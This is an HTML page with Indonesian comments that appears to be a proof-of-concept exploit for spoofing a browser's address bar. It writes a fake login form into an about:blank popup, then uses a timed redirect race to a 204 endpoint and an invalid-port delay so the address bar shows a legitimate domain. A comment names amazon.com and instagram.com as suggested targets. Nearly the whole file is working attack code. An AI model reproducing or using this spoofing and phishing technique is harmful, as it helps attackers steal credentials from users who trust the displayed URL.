<!DOCTYPE html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>
  <button onclick="openWindow()">1. Open Popup (about:blank)</button>
  <button onclick="injectAndRace()">2. Inject Content + Start Race Navigation</button>

  <script>
    let popup;

    function openWindow() {
      // Buka about:blank dengan nama unik untuk reuse
      popup = window.open('about:blank', 'spoofwin', 'width=600,height=800');
      if (!popup) alert('Popup diblok! Izinkan popup untuk site ini.');
    }

    function injectAndRace() {
      if (!popup) return alert('Buka popup dulu!');

      // Langkah 1: Tulis content attacker SEKALIGUS (full HTML) sebelum navigation
      popup.document.open();
      popup.document.write(`
        <!DOCTYPE html>
        <html>
        <head><title>Contoh Spoof</title></head>
        <body style="font-family:sans-serif;padding:20px;background:#fff;">
          <h2>INI CONTENT ATTACKER-CONTROLLED (Phishing Demo)</h2>
          <p>Address bar seharusnya masih show URL spoofed jika race menang.</p>
          <form>
            <input type="text" placeholder="Username" style="width:100%;padding:10px;margin:10px 0;">
            <input type="password" placeholder="Password">
            <button type="button" style="background:#007bff;color:white;padding:10px;width:100%;">Login</button>
          </form>
          <p style="color:red;">DEMO SPOOFING - JANGAN MASUKKAN DATA ASLI!</p>
        </body>
        </html>
      `);
      popup.document.close();

      // Langkah 2: Mulai race — navigate ke legitimate URL, tapi rapid redirect ke 204
      const targetUrl = 'https://www.example.com';  // Ganti dengan domain legitimate (amazon.com, instagram.com, dll)
      popup.location.href = targetUrl;

      // Aggressive race loop dengan timing variasi untuk tingkatkan win rate
      let attempts = 0;
      const raceInterval = setInterval(() => {
        try {
          // Trigger exception jika navigation sudah commit
          popup.location.href;
          popup.document.title;  // Extra check
        } catch (e) {
          // Race win: redirect ke 204 No Content → harapan freeze address bar
          popup.location.href = 'https://www.google.com/csi?v=2&s=web&t=' + Date.now();
          attempts++;
          if (attempts > 20) clearInterval(raceInterval);
        }
      }, 50);

      // Tambahan delay + non-standard port untuk slow navigation (kadang membantu)
      setInterval(() => {
        popup.location.href = targetUrl + ':82';  // Port invalid → delay load
      }, 50);
    }
  </script>
</body>
</html>
